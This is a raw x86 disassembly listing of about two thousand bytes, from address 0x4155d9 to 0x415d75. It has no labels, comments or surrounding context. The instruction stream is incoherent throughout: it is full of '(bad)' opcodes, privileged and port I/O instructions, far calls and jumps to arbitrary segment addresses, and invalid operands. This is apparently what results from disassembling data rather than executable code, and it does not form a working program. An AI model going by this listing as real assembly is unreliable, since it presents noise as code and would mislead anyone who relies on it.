  4155d9:	add    eax,0x9cbf522e
  4155de:	adc    ecx,DWORD PTR [eax]
  4155e0:	shr    DWORD PTR [ebp-0x26812db2],1
  4155e6:	in     eax,dx
  4155e7:	mov    ?,WORD PTR [ebp+0x17]
  4155ea:	in     al,0x22
  4155ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155ed:	(bad)  
  4155ee:	icebp  
  4155ef:	jmp    0x721eaf29
  4155f4:	shl    ah,0xe8
  4155f7:	add    ch,0xd2
  4155fa:	les    esi,FWORD PTR [edi+0x3d438a35]
  415600:	ins    BYTE PTR es:[edi],dx
  415601:	dec    esi
  415602:	add    dh,al
  415604:	(bad)  
  415605:	pop    ebx
  415606:	and    DWORD PTR [eax],ebx
  415608:	fsubr  QWORD PTR [esi-0x24]
  41560b:	push   es
  41560c:	push   ebp
  41560d:	jbe    0x415666
  41560f:	xchg   ecx,eax
  415610:	out    dx,al
  415611:	push   ds
  415612:	sbb    DWORD PTR [ebx-0x56],edi
  415615:	je     0x41567c
  415617:	jnp    0x415695
  415619:	jae    0x415616
  41561b:	xchg   ebx,eax
  41561c:	jbe    0x41563b
  41561e:	or     BYTE PTR [esi],cl
  415620:	sub    BYTE PTR [edi-0x67f5b7d4],ah
  415626:	call   0x8cb6:0xdd0bc85e
  41562d:	int3   
  41562e:	jns    0x415622
  415630:	jbe    0x415692
  415632:	int    0x17
  415634:	fst    st(6)
  415636:	lock or al,0xff
  415639:	aas    
  41563a:	cmp    eax,DWORD PTR [ebp+ebp*1-0x23]
  41563e:	out    0xf0,eax
  415640:	and    al,0x43
  415642:	(bad)  
  415643:	(bad)  
  415644:	(bad)  
  415645:	neg    ah
  415647:	sub    bh,BYTE PTR [esi-0x31e6d58d]
  41564d:	push   es
  41564e:	mov    eax,0x74952ac0
  415653:	adc    eax,0xcfb9e34
  415658:	addr16 pop ds
  41565a:	xchg   edx,eax
  41565b:	inc    eax
  41565c:	push   ds
  41565d:	mov    edi,0xae40beea
  415662:	mov    bh,BYTE PTR [eax]
  415664:	sub    eax,0xb70de4e0
  415669:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41566a:	addr16 xor eax,0xc09a31d9
  415670:	mov    eax,ds:0xd90685fe
  415675:	les    eax,FWORD PTR [ebx+0x2]
  415678:	sbb    BYTE PTR [edx-0x236c262f],ah
  41567e:	inc    esi
  41567f:	bound  esi,QWORD PTR ds:0x4aa6b544
  415685:	pop    edx
  415686:	push   eax
  415687:	xchg   esp,ebp
  415689:	mov    esi,0x77d91206
  41568e:	es mov ch,0x48
  415691:	sub    al,0xcf
  415693:	loop   0x415690
  415695:	jae    0x4156b2
  415697:	clc    
  415698:	cwde   
  415699:	dec    ebx
  41569a:	jo     0x4156b6
  41569c:	mov    BYTE PTR [esi+edi*8-0x7ef6f8],bl
  4156a3:	lds    ebx,FWORD PTR [edx+0x4bb02d7d]
  4156a9:	pop    es
  4156aa:	push   ecx
  4156ab:	gs or  bh,ch
  4156ae:	push   cs
  4156af:	and    bl,dh
  4156b1:	pushf  
  4156b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156b3:	inc    ebp
  4156b4:	xchg   esp,eax
  4156b5:	dec    ecx
  4156b6:	sub    cl,BYTE PTR [ebx-0x47d3f425]
  4156bc:	jg     0x4156da
  4156be:	scas   al,BYTE PTR es:[edi]
  4156bf:	test   DWORD PTR [ebx-0x5],ecx
  4156c2:	add    bh,BYTE PTR [ecx+0x89fb16]
  4156c8:	adc    edx,DWORD PTR [ecx+0x59]
  4156cb:	jp     0x41573d
  4156cd:	xlat   BYTE PTR ds:[ebx]
  4156ce:	shr    edi,cl
  4156d0:	lea    esp,[eax+0x5569de2e]
  4156d6:	xor    esp,ecx
  4156d8:	test   eax,0xfc918c3a
  4156dd:	push   ebp
  4156de:	xchg   edx,eax
  4156df:	popf   
  4156e0:	dec    edi
  4156e1:	or     al,0x1e
  4156e3:	(bad)  
  4156e4:	cmp    al,0x60
  4156e6:	test   BYTE PTR [edx],dl
  4156e8:	mov    eax,ds:0xec366df3
  4156ed:	icebp  
  4156ee:	mov    bl,0xfa
  4156f0:	mov    BYTE PTR [edi],cl
  4156f2:	cli    
  4156f3:	mov    dl,0xde
  4156f5:	pop    ebp
  4156f6:	out    0xea,eax
  4156f8:	sbb    cl,BYTE PTR [edx+edi*2]
  4156fb:	and    eax,0x9b82bb5
  415700:	fiadd  DWORD PTR [esi-0x7c0b25c1]
  415706:	inc    esp
  415707:	out    dx,al
  415708:	sahf   
  415709:	int3   
  41570a:	mov    cl,0x9d
  41570c:	adc    DWORD PTR [ecx+0x2c],edi
  41570f:	addr16 call 0xbf3e:0x163f5851
  415717:	jmp    0x4156ee
  415719:	aaa    
  41571a:	adc    edx,DWORD PTR [esi-0x8742bd5]
  415720:	aas    
  415721:	sub    ch,BYTE PTR [ecx+0x597ece43]
  415727:	ja     0x415722
  415729:	(bad)  [ecx+0x2fd74b99]
  41572f:	cdq    
  415730:	bound  esi,QWORD PTR [eax-0x377e01d8]
  415736:	adc    bh,ch
  415738:	(bad)  
  415739:	push   ebp
  41573a:	lahf   
  41573b:	seto   BYTE PTR [eax+0x2f]
  41573f:	jge    0x4156ec
  415741:	aam    0x4b
  415743:	cwde   
  415744:	stos   DWORD PTR es:[edi],eax
  415745:	pop    ds
  415746:	add    cl,BYTE PTR [esi]
  415748:	repz xor ecx,esp
  41574b:	aam    0x1e
  41574d:	push   0x79690155
  415752:	pop    es
  415753:	test   eax,0xe854fa5c
  415758:	out    0xa9,al
  41575a:	shl    ch,0xf9
  41575d:	mov    ?,WORD PTR ds:0x6fa83ee
  415763:	mov    edi,0x48c0b0b6
  415768:	push   es
  415769:	pop    esi
  41576a:	mov    ah,0x34
  41576c:	ins    BYTE PTR es:[edi],dx
  41576d:	jmp    0x1f51:0xc12b8d87
  415774:	xlat   BYTE PTR ds:[ebx]
  415775:	cdq    
  415776:	fstp   TBYTE PTR [eax]
  415778:	or     eax,DWORD PTR [ecx-0x4c]
  41577b:	in     al,dx
  41577c:	push   ds
  41577d:	add    DWORD PTR [ecx],esi
  41577f:	mov    dl,0x57
  415781:	sbb    DWORD PTR [edx],eax
  415783:	mov    eax,DWORD PTR [ebp+0x6167fa89]
  415789:	sbb    DWORD PTR [edx-0x2be8c8fd],ecx
  41578f:	jae    0x415745
  415791:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415792:	sub    ebx,DWORD PTR [ebx]
  415794:	loop   0x415779
  415796:	neg    bh
  415798:	rol    BYTE PTR [edi],cl
  41579a:	js     0x4157a8
  41579c:	(bad)  
  41579d:	pop    ebx
  41579e:	sub    DWORD PTR [esp+ebp*4+0x71],0xffffff9e
  4157a3:	call   0x444d149f
  4157a8:	(bad)  
  4157a9:	push   edi
  4157aa:	nop
  4157ab:	(bad)  [esi-0x1a357c9d]
  4157b1:	sbb    dl,al
  4157b3:	and    eax,0x47ad7273
  4157b8:	add    eax,0x7240ee7b
  4157bd:	shr    al,1
  4157bf:	mov    al,ds:0xf96cf04
  4157c4:	or     dh,0xbb
  4157c7:	mov    ch,0x94
  4157c9:	test   DWORD PTR [esp+ecx*8+0x5f215feb],0x168b1bbe
  4157d4:	cmp    BYTE PTR [ecx],ch
  4157d6:	sub    eax,0xea5614bc
  4157db:	jnp    0x415810
  4157dd:	lea    edi,[edx]
  4157df:	enter  0x567e,0x2a
  4157e3:	imul   dx,WORD PTR [ebx],0xffbc
  4157e7:	mov    dl,0xf1
  4157e9:	ja     0x4157e1
  4157eb:	xchg   edi,eax
  4157ec:	(bad)  
  4157ed:	ror    esp,cl
  4157ef:	xor    eax,esp
  4157f1:	mov    DWORD PTR [ebp+0x8681e09],ebx
  4157f7:	dec    edi
  4157f8:	inc    ecx
  4157f9:	shr    DWORD PTR [edx],1
  4157fb:	or     eax,DWORD PTR [ecx+edx*4-0x58c577a6]
  415802:	mov    eax,edi
  415804:	inc    esi
  415805:	ucomiss xmm0,DWORD PTR [edx]
  415808:	je     0x415851
  41580a:	jb     0x4157e2
  41580c:	pop    esi
  41580d:	mov    ah,0x97
  41580f:	ficomp DWORD PTR [edi-0x49ed0453]
  415815:	mov    esi,0xcd7da712
  41581a:	mov    eax,0xcb101c77
  41581f:	xor    al,0x35
  415821:	fcmovbe st,st(7)
  415823:	mov    esi,DWORD PTR [ebp+0x5b]
  415826:	jae    0x415851
  415828:	rcl    DWORD PTR [ecx+edi*8+0x55],0x90
  41582d:	ret    0x3b71
  415830:	cmp    ebp,DWORD PTR ds:0x3f6bf822
  415836:	loopne 0x41582d
  415838:	xor    BYTE PTR [eax],0xc0
  41583b:	pop    ebx
  41583c:	mov    WORD PTR [esi],cs
  41583e:	and    DWORD PTR [eax],0x43e41ef7
  415844:	sub    al,0x6d
  415846:	aad    0xf5
  415848:	loopne 0x4158ab
  41584a:	rcl    BYTE PTR [edx],1
  41584c:	pop    esi
  41584d:	sahf   
  41584e:	imul   ebp,DWORD PTR [eax+0x87b6227],0x33
  415855:	xlat   BYTE PTR ds:[ebx]
  415856:	or     esi,esp
  415858:	mov    DWORD PTR ds:0xf2c3fde8,0xccc67302
  415862:	ficomp DWORD PTR [eax+edi*4]
  415865:	xor    cl,BYTE PTR [eax-0x6c]
  415868:	ins    BYTE PTR es:[edi],dx
  415869:	add    DWORD PTR [ebx-0x52],edx
  41586c:	add    al,0x1
  41586e:	rcl    BYTE PTR [eax-0x60],cl
  415871:	xor    eax,0x6a8c183f
  415876:	loope  0x41583b
  415878:	push   es
  415879:	or     al,0x7c
  41587b:	leave  
  41587c:	jb     0x415898
  41587e:	cmc    
  41587f:	sub    DWORD PTR [edi-0xc],ebp
  415882:	push   eax
  415883:	push   ds
  415884:	leave  
  415885:	scas   eax,DWORD PTR es:[edi]
  415886:	rcr    DWORD PTR [eax-0x53b76cf7],1
  41588c:	pop    edx
  41588d:	sbb    al,0x14
  41588f:	add    ah,cl
  415891:	mov    al,ds:0x1fdcebd6
  415896:	push   cs
  415897:	enter  0x731b,0x95
  41589b:	inc    esp
  41589c:	adc    cl,BYTE PTR [esi+0x49f1ada0]
  4158a2:	shl    DWORD PTR [ebx],0xc9
  4158a5:	pop    ebx
  4158a6:	sbb    ebp,eax
  4158a8:	jle    0x4158f5
  4158aa:	mov    edi,0x614ef3f7
  4158af:	mov    ds:0x538fa040,al
  4158b4:	ds pop ebp
  4158b6:	sub    eax,0x910e1118
  4158bb:	inc    esp
  4158bc:	cmp    dl,BYTE PTR [ebp+0x2518e488]
  4158c2:	sti    
  4158c3:	fst    DWORD PTR [eax]
  4158c5:	enter  0xbf12,0xcd
  4158c9:	scas   eax,DWORD PTR es:[edi]
  4158ca:	aad    0xcb
  4158cc:	jo     0x41585e
  4158ce:	adc    DWORD PTR [ebp+0x4e],eax
  4158d1:	arpl   sp,bp
  4158d3:	mov    esi,0xa56ff0b0
  4158d8:	inc    ebp
  4158d9:	cmp    al,0x2b
  4158db:	mov    al,0xec
  4158dd:	inc    edx
  4158de:	div    ebx
  4158e0:	iret   
  4158e1:	fwait
  4158e2:	bound  edx,QWORD PTR [ebx]
  4158e4:	pusha  
  4158e5:	mov    al,0x8e
  4158e7:	cld    
  4158e8:	cmp    esi,DWORD PTR [ebx+0x5]
  4158eb:	imul   esp,DWORD PTR [ebx+0x76],0xffffff83
  4158ef:	mov    bh,0x1d
  4158f1:	icebp  
  4158f2:	cmp    DWORD PTR [eax-0x2a],0xffffffa7
  4158f6:	inc    ebp
  4158f7:	mov    ch,0xf1
  4158f9:	cmp    edx,eax
  4158fb:	scas   al,BYTE PTR es:[edi]
  4158fc:	js     0x4158e8
  4158fe:	mov    ds:0x5aeea3e9,al
  415903:	repz sub BYTE PTR [edi],bl
  415906:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415907:	push   0x10
  415909:	dec    edx
  41590a:	jns    0x4158ce
  41590c:	rcl    BYTE PTR [eax-0x39],cl
  41590f:	cwde   
  415910:	jge    0x4158e4
  415912:	outs   dx,BYTE PTR ds:[esi]
  415913:	pushf  
  415914:	pop    ss
  415915:	mov    dl,0x13
  415917:	push   ebp
  415918:	rcr    BYTE PTR [edx-0x9],1
  41591b:	dec    eax
  41591c:	adc    DWORD PTR [esp+eiz*4],edi
  41591f:	push   ss
  415920:	dec    edi
  415921:	cmc    
  415922:	fldcw  WORD PTR [edx+ecx*8+0x71]
  415926:	push   es
  415927:	and    DWORD PTR [eax-0x730d04e8],edx
  41592d:	xchg   ebx,eax
  41592e:	popf   
  41592f:	retf   0x6007
  415932:	sub    eax,0xfd5363b4
  415937:	xor    DWORD PTR [edi],ebp
  415939:	cmp    ch,ah
  41593b:	cmp    edi,esi
  41593d:	cdq    
  41593e:	jl     0x4159ba
  415940:	int    0x6e
  415942:	push   es
  415943:	cmp    eax,0x3a891902
  415948:	xor    dh,0xab
  41594b:	fistp  QWORD PTR ds:0x3826f20f
  415951:	lds    edx,FWORD PTR [esi-0x59]
  415954:	or     al,0xc6
  415956:	stos   DWORD PTR es:[edi],eax
  415957:	cdq    
  415958:	add    al,0x6f
  41595a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41595b:	jp     0x41597c
  41595d:	rcr    DWORD PTR ds:0x9f97d2d5,1
  415963:	ret    
  415964:	pop    ebp
  415965:	mov    ecx,0x23af623
  41596a:	adc    al,0x8c
  41596c:	cmp    al,0xc6
  41596e:	out    0x95,al
  415970:	xchg   BYTE PTR [esi+eiz*2+0x23d7c879],al
  415977:	mov    ecx,DWORD PTR [esi-0x4]
  41597a:	inc    esi
  41597b:	push   esi
  41597c:	leave  
  41597d:	push   ss
  41597e:	xchg   esi,eax
  41597f:	je     0x415976
  415981:	lahf   
  415982:	add    DWORD PTR [esi],0xbf206714
  415988:	inc    edx
  415989:	arpl   sp,di
  41598b:	loopne 0x415969
  41598d:	shr    BYTE PTR [edi],cl
  41598f:	cmp    BYTE PTR [ebx+0x2b9bfc67],cl
  415995:	xor    al,BYTE PTR [esi+0x6d]
  415998:	push   ebp
  415999:	mov    gs,WORD PTR [ebp-0x25]
  41599c:	lods   al,BYTE PTR ds:[esi]
  41599d:	dec    ebx
  41599e:	sbb    eax,0x8be71794
  4159a3:	mov    eax,0x899f322b
  4159a8:	mov    al,0xcc
  4159aa:	jl     0x4159d8
  4159ac:	xor    al,0x4b
  4159ae:	out    dx,al
  4159af:	mov    esi,DWORD PTR [eax+0x54ed1214]
  4159b5:	fnstsw WORD PTR [ecx]
  4159b7:	add    al,0x16
  4159b9:	push   ds
  4159ba:	lods   al,BYTE PTR ds:[esi]
  4159bb:	out    dx,al
  4159bc:	or     edi,ebp
  4159be:	xchg   ecx,eax
  4159bf:	lahf   
  4159c0:	ds dec esp
  4159c2:	pop    ss
  4159c3:	rcl    BYTE PTR [ebx],cl
  4159c5:	inc    ebx
  4159c6:	cmp    BYTE PTR [edx],dl
  4159c8:	stos   DWORD PTR es:[edi],eax
  4159c9:	(bad)  
  4159cb:	or     DWORD PTR [esp+ebp*4+0x17],0x71
  4159d0:	pop    eax
  4159d1:	xchg   DWORD PTR [esi],ecx
  4159d3:	gs dec esi
  4159d5:	aaa    
  4159d6:	lock xor eax,0x47a26244
  4159dc:	(bad)  
  4159dd:	jl     0x415999
  4159df:	ss push edi
  4159e1:	mov    ebx,0x74777658
  4159e6:	scas   al,BYTE PTR es:[edi]
  4159e7:	in     eax,dx
  4159e8:	ins    DWORD PTR es:[edi],dx
  4159e9:	pop    ecx
  4159ea:	add    esp,DWORD PTR [edi+0x33]
  4159ed:	imul   ecx,DWORD PTR [esi],0xfffffff1
  4159f0:	push   ecx
  4159f1:	push   edi
  4159f2:	sub    BYTE PTR [esi+0x3b],dh
  4159f5:	scas   eax,DWORD PTR es:[edi]
  4159f6:	xor    BYTE PTR [edi-0x46c8c576],bl
  4159fc:	inc    eax
  4159fd:	jmp    0x4159f2
  4159ff:	xchg   BYTE PTR [ebp-0x4fda7228],ch
  415a05:	add    eax,0x1a22c385
  415a0a:	out    dx,eax
  415a0b:	aas    
  415a0c:	jp     0x415a7e
  415a0e:	iret   
  415a0f:	pop    ecx
  415a10:	(bad)  
  415a11:	xchg   ebp,eax
  415a12:	cmp    ebp,edi
  415a14:	and    dh,BYTE PTR [ebx+0x4ba7495a]
  415a1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a1b:	fdiv   QWORD PTR [eax+0x1eb0e3ec]
  415a21:	std    
  415a22:	sub    eax,0x30b6a15f
  415a27:	imul   ebp,DWORD PTR [eax+ebx*2+0x5a10d888],0xffffffdb
  415a2f:	pop    es
  415a30:	out    0xa8,al
  415a32:	jp     0x4159dc
  415a34:	pop    eax
  415a35:	fisttp WORD PTR [ebx+0xe]
  415a38:	fisub  WORD PTR [ebp-0x47]
  415a3b:	gs jns 0x415a7b
  415a3e:	mov    dh,0x10
  415a40:	inc    eax
  415a41:	mov    DWORD PTR [ebx],0x991b0eb9
  415a47:	or     al,0x2c
  415a49:	mov    ebp,0xe2ef39ad
  415a4e:	test   eax,0xd6aa2a30
  415a53:	mov    dl,0x79
  415a55:	pop    edi
  415a56:	inc    eax
  415a57:	retf   0x3910
  415a5a:	stc    
  415a5b:	(bad)  
  415a5c:	xchg   esi,eax
  415a5d:	adc    BYTE PTR ds:0x36decab5,al
  415a63:	push   cs
  415a64:	icebp  
  415a65:	icebp  
  415a66:	ja     0x415ab3
  415a68:	scas   eax,DWORD PTR es:[edi]
  415a69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a6a:	test   eax,0x6d2ce2a
  415a6f:	retf   0xc
  415a72:	or     bh,0x1f
  415a75:	cdq    
  415a76:	or     eax,0x6e32bfcd
  415a7b:	mov    ecx,0x462e1a51
  415a80:	xchg   ebp,eax
  415a81:	out    dx,al
  415a82:	push   edi
  415a83:	or     ebx,DWORD PTR fs:[edi+0x15]
  415a87:	sbb    al,0xc3
  415a89:	es inc ebx
  415a8b:	mov    ds:0x38a55b13,al
  415a90:	scas   eax,DWORD PTR es:[edi]
  415a91:	or     DWORD PTR [esi],esi
  415a93:	push   es
  415a94:	or     BYTE PTR [esi],cl
  415a96:	inc    ebx
  415a97:	popf   
  415a98:	ret    
  415a99:	test   al,0x71
  415a9b:	fadd   DWORD PTR [eax]
  415a9d:	mov    cl,bh
  415a9f:	jo     0x415ac2
  415aa1:	and    esi,esi
  415aa3:	clc    
  415aa4:	rcl    BYTE PTR [eax-0x1974e43],cl
  415aaa:	push   edx
  415aab:	movlhps xmm1,xmm5
  415aae:	leave  
  415aaf:	dec    edi
  415ab0:	lock stc 
  415ab2:	rcr    ecx,0x63
  415ab5:	mov    bh,0x3f
  415ab7:	fadd   st(4),st
  415ab9:	adc    edi,edi
  415abb:	xor    esi,DWORD PTR [esp+eax*4-0x10]
  415abf:	leave  
  415ac0:	xchg   esp,eax
  415ac1:	sub    al,0xbc
  415ac3:	cld    
  415ac4:	rcr    ah,cl
  415ac6:	pop    es
  415ac7:	repz jae 0x415aa0
  415aca:	pop    ds
  415acb:	mov    ?,WORD PTR [edi]
  415acd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ace:	fs xchg esp,eax
  415ad0:	add    BYTE PTR [ecx+0x3f54f467],0x3f
  415ad7:	stc    
  415ad8:	dec    edx
  415ad9:	aam    0x40
  415adb:	sar    DWORD PTR [edx+ebp*8-0x22],cl
  415adf:	adc    eax,0x423acbfb
  415ae4:	jge    0x415b2d
  415ae6:	ja     0x415aa3
  415ae8:	(bad)  
  415ae9:	cdq    
  415aea:	dec    edx
  415aeb:	lea    eax,[esi-0x6c4d0b3a]
  415af1:	jp     0x415b2b
  415af3:	dec    edx
  415af4:	daa    
  415af5:	mov    esi,0xe2d8c50a
  415afa:	push   ebx
  415afb:	std    
  415afc:	mov    ds:0x25ec6e19,al
  415b01:	cdq    
  415b02:	push   ebp
  415b03:	mov    WORD PTR [ebx],?
  415b05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b06:	sahf   
  415b07:	or     edx,ecx
  415b09:	adc    dh,BYTE PTR [esi]
  415b0b:	loopne 0x415b81
  415b0d:	cli    
  415b0e:	int3   
  415b0f:	mov    ss,WORD PTR [edi-0x68d0281d]
  415b15:	shl    DWORD PTR [edx-0x6d],cl
  415b18:	data16 and bl,BYTE PTR [esi+ebp*4-0x80]
  415b1d:	push   es
  415b1e:	ss lock pop ebx
  415b21:	sub    al,0xdb
  415b23:	shr    DWORD PTR [edx],0x9c
  415b26:	imul   eax,DWORD PTR [esp+ebx*4+0x6d],0x7f
  415b2b:	imul   edx,DWORD PTR [ebx],0x53
  415b2e:	mov    cr4,edx
  415b31:	fnstsw WORD PTR [edi]
  415b33:	out    0x99,eax
  415b35:	fnstenv [ebp-0xbd3e309]
  415b3b:	enter  0x8a4e,0xff
  415b3f:	pop    eax
  415b40:	ds cdq 
  415b42:	ret    
  415b43:	aam    0x3
  415b45:	nop
  415b46:	fwait
  415b47:	jns    0x415b70
  415b49:	pushf  
  415b4a:	js     0x415ae3
  415b4c:	or     ebx,DWORD PTR [ebp+0x2349357b]
  415b52:	sub    bl,BYTE PTR [edx+eax*4-0x61]
  415b56:	retf   
  415b57:	test   edx,0x8eda8381
  415b5d:	cmp    esp,DWORD PTR [edx]
  415b5f:	sub    al,0x1
  415b61:	sar    BYTE PTR [edx-0x1cf1e2a7],1
  415b67:	repz adc bh,dh
  415b6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b6b:	inc    edi
  415b6c:	xor    DWORD PTR [edx-0x5d991d6d],ebx
  415b72:	xor    esp,DWORD PTR [ecx+esi*2+0x39fcb7fd]
  415b79:	dec    ebp
  415b7a:	popa   
  415b7b:	(bad)  
  415b7c:	and    eax,0xfe2001b8
  415b81:	shl    DWORD PTR [edi],0xf1
  415b84:	popf   
  415b85:	jmp    0x415b97
  415b87:	lods   al,BYTE PTR ds:[esi]
  415b88:	dec    eax
  415b89:	(bad)
  415b8c:	pop    edi
  415b8d:	popf   
  415b8e:	call   0xea99:0xce9c44d9
  415b95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b96:	xchg   esp,eax
  415b97:	jge    0x415b9f
  415b99:	pop    edi
  415b9a:	mov    edx,0xcd892ac9
  415b9f:	(bad)  
  415ba0:	retf   
  415ba1:	xlat   BYTE PTR ds:[ebx]
  415ba2:	cmp    ebp,DWORD PTR ds:0xf9a5908d
  415ba8:	or     al,0x5d
  415baa:	xchg   ebx,eax
  415bab:	lock inc eax
  415bad:	mov    ebx,0xdc757dee
  415bb2:	push   edx
  415bb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bb4:	scas   al,BYTE PTR es:[edi]
  415bb5:	cli    
  415bb6:	xchg   ebx,eax
  415bb7:	gs inc esp
  415bb9:	lods   eax,DWORD PTR ds:[esi]
  415bba:	add    dh,BYTE PTR [edx+0x5b44bb34]
  415bc0:	(bad)  
  415bc1:	mov    eax,0x8b39f690
  415bc6:	adc    eax,edx
  415bc8:	sbb    bh,BYTE PTR [esi+ebp*4+0x2d]
  415bcc:	mov    eax,DWORD PTR [ebx+0x504c1ab4]
  415bd2:	cli    
  415bd3:	xor    dl,BYTE PTR ds:0xe25f5939
  415bd9:	xor    BYTE PTR [edi+eiz*1],ch
  415bdc:	push   esi
  415bdd:	and    eax,0x2bc3b5e1
  415be2:	jno    0x415beb
  415be4:	int3   
  415be5:	inc    esp
  415be6:	enter  0x1845,0x85
  415bea:	xor    DWORD PTR [edx-0x1f336117],0x176cc9df
  415bf4:	daa    
  415bf5:	enter  0xe639,0x92
  415bf9:	aad    0x8
  415bfb:	xlat   BYTE PTR ds:[ebx]
  415bfc:	popf   
  415bfd:	or     DWORD PTR [ecx-0x10e7eba6],esp
  415c03:	pop    edx
  415c04:	mov    dh,0xbb
  415c06:	mov    cl,BYTE PTR [edi+0x22a50c2b]
  415c0c:	shl    DWORD PTR [esi-0x1270514a],cl
  415c12:	jmp    0x31e4c285
  415c17:	rcl    DWORD PTR [ebx+0x7664d6fc],1
  415c1d:	and    BYTE PTR [edi-0x75584d21],ch
  415c23:	dec    ebx
  415c24:	pop    es
  415c25:	ds inc edx
  415c27:	addr16 add ah,ch
  415c2a:	jecxz  0x415ca1
  415c2c:	sub    al,0xed
  415c2e:	pop    ecx
  415c2f:	int    0x72
  415c31:	js     0x415cb0
  415c33:	pop    esp
  415c34:	sub    ah,BYTE PTR [ebp+eax*4+0x8]
  415c38:	stos   BYTE PTR es:[edi],al
  415c39:	(bad)  
  415c3a:	xor    DWORD PTR [edi-0x44],ebp
  415c3d:	xor    al,0xae
  415c3f:	fs cli 
  415c41:	ficom  WORD PTR [esi]
  415c43:	ret    
  415c44:	(bad)  
  415c46:	pop    eax
  415c47:	xchg   esi,eax
  415c48:	mov    eax,0x5b376715
  415c4d:	cmp    ecx,edx
  415c4f:	inc    ecx
  415c50:	mov    fs,WORD PTR [eax-0x5952eae3]
  415c56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c57:	mov    ds,WORD PTR [ecx]
  415c59:	mov    esp,0xbf3d7a67
  415c5e:	mov    cl,0x19
  415c60:	jl     0x415c53
  415c62:	stos   DWORD PTR es:[edi],eax
  415c63:	cmp    esi,DWORD PTR [edx]
  415c65:	in     al,0x67
  415c67:	es out dx,al
  415c69:	jo     0x415ce0
  415c6b:	jb     0x415c3a
  415c6d:	cmp    BYTE PTR fs:[esi+0x146f65b3],dl
  415c74:	jmp    0x415c37
  415c76:	jne    0x415c6f
  415c78:	ror    ecx,cl
  415c7a:	fnstcw WORD PTR [ecx-0x57]
  415c7d:	jecxz  0x415ce5
  415c7f:	aad    0x6b
  415c81:	push   es
  415c82:	inc    ebp
  415c83:	rcl    BYTE PTR [edi+ebp*4-0x39366eef],1
  415c8a:	out    0xab,al
  415c8c:	cwde   
  415c8d:	add    ecx,DWORD PTR [edi]
  415c8f:	xor    al,0x3a
  415c91:	add    BYTE PTR [esi],bh
  415c93:	ss pop edi
  415c95:	pop    esp
  415c96:	and    eax,0x5b96c43f
  415c9b:	clc    
  415c9c:	popa   
  415c9d:	in     eax,0x83
  415c9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ca0:	mov    ?,ebp
  415ca2:	pop    ss
  415ca3:	jle    0x415c6c
  415ca5:	mov    bl,0xa9
  415ca7:	js     0x415c38
  415ca9:	jne    0x415c9b
  415cab:	sbb    ah,BYTE PTR [esi]
  415cad:	out    dx,al
  415cae:	test   bh,dh
  415cb0:	sub    al,0x6e
  415cb2:	popf   
  415cb3:	xchg   BYTE PTR [esi+edx*8],bh
  415cb6:	jg     0x415c9b
  415cb8:	push   ebp
  415cb9:	mov    ch,BYTE PTR ds:0x8e2a48ba
  415cbf:	sub    ebp,ebp
  415cc1:	(bad)  
  415cc2:	enter  0xd9b1,0xeb
  415cc6:	sub    eax,0x9af6e414
  415ccb:	xchg   eax,eax
  415ccd:	inc    edi
  415cce:	inc    ebx
  415ccf:	mov    cl,0x5f
  415cd1:	and    BYTE PTR [edx-0x23],cl
  415cd4:	enter  0x7a72,0x19
  415cd8:	jmp    0x415c84
  415cda:	jbe    0x415c75
  415cdc:	ss stos DWORD PTR es:[edi],eax
  415cde:	addr16 sbb eax,0xffc68b56
  415ce4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ce5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ce6:	mov    cl,0xa2
  415ce8:	leave  
  415ce9:	push   ss
  415cea:	in     eax,dx
  415ceb:	cs and bh,0x1a
  415cef:	addr16 dec esp
  415cf1:	fnsave [eax+ebp*4-0x621e3d75]
  415cf8:	and    BYTE PTR [esi],ch
  415cfa:	sub    ch,cl
  415cfc:	(bad)  
  415cfd:	fdivr  st,st(3)
  415cff:	mov    ah,0xe7
  415d01:	sbb    edx,esi
  415d03:	pop    ebp
  415d04:	das    
  415d05:	loope  0x415cc3
  415d07:	jp     0x415ce2
  415d09:	push   0xffffffd0
  415d0b:	push   eax
  415d0c:	call   0x334e9c47
  415d11:	(bad)
  415d14:	lahf   
  415d15:	js     0x415d4d
  415d17:	xor    cl,al
  415d19:	adc    BYTE PTR [esi+0x7053133a],bl
  415d1f:	(bad)  
  415d20:	xchg   edx,eax
  415d21:	jb     0x415d7a
  415d23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d25:	mov    esi,0xbb568e3e
  415d2a:	adc    esi,0xfffffffb
  415d2d:	xchg   ebx,eax
  415d2e:	push   ds
  415d2f:	mov    WORD PTR [edx-0x95fd301],cs
  415d35:	push   ebx
  415d36:	sbb    al,0xbe
  415d38:	js     0x415d29
  415d3a:	ret    
  415d3b:	cs xor al,0x28
  415d3e:	retf   
  415d3f:	mov    eax,ds:0xb1847c50
  415d44:	jns    0x415d55
  415d46:	mov    ebx,0x3d963f91
  415d4b:	dec    eax
  415d4c:	adc    eax,0x8bbeeb5
  415d51:	inc    eax
  415d52:	jg     0x415d54
  415d54:	mov    bl,0xaa
  415d56:	push   esi
  415d57:	push   cs
  415d58:	leave  
  415d59:	and    dh,dh
  415d5b:	cdq    
  415d5c:	lods   al,BYTE PTR ds:[esi]
  415d5d:	adc    eax,0x74e8471a
  415d62:	clc    
  415d63:	mov    ds:0x39248c67,al
  415d68:	and    DWORD PTR [esi+0x38],ebp
  415d6b:	adc    ah,BYTE PTR [eax-0x4b]
  415d6e:	or     edi,ebx
  415d70:	cmp    al,0x76
  415d72:	dec    eax
  415d73:	mov    esi,eax
  415d75:	fs sub bh,al
